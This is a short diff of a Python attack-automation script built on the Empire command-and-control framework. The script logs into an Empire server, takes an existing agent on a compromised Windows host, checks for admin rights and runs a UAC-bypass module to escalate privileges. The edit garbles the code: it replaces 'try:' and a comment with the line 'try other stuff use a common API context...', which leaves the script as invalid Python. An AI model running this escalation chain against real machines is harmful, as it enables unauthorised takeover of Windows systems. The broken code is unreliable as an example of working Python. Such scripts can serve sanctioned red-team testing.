@@ -9,9 +9,7 @@ from empire_autocomplete import privesc
 from stage2.external_c2 import empire_wait_for_agent
 from stage3.internal_reconn.windows import empire_is_user_admin
 from stage3.escalate_privilege.windows import empire_bypassUAC
-
-try:
-    # use a common API context instead of creating a new one per technique
+try other stuff use a common API context instead of creating a new one per technique
     API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
 
     # we assume there's a non-privilege agent, some stager was executed before
@@ -19,7 +17,7 @@ try:
     admin_type = empire_is_user_admin.run(API, agent['name']) 
     if admin_type is None:
         raise ValueError('BypassUAC can only be used with admin user')
-        # we could do more things to try to EoP but not in this example
+        # we could try other stuff to EoP but not in this example
 
     empire_bypassUAC.run(API, agent['name'], privesc.bypassuac.path)
 
